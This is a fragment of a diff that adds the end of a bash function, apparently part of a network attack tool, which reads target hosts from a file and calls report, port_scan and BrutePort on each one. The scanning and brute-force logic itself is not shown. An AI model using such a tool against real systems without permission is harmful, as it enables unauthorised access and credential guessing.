+  		thread=$2
+  	fi
+  fi
+
+  if [[ -f $1 ]]; then
+  	while IFS= read -r line; do
+  		sleep 1
+  		report $line
+  		port_scan $line
+  		BrutePort $line $2
+  	done < "$1"
+  	exit
+  fi
+
+  # sleep 1
+  # report $1
+  # port_scan $1
+  # BrutePort $1 $2
+
+  read -p "$Press_ENTER"
+
+
+}
+BrutePort
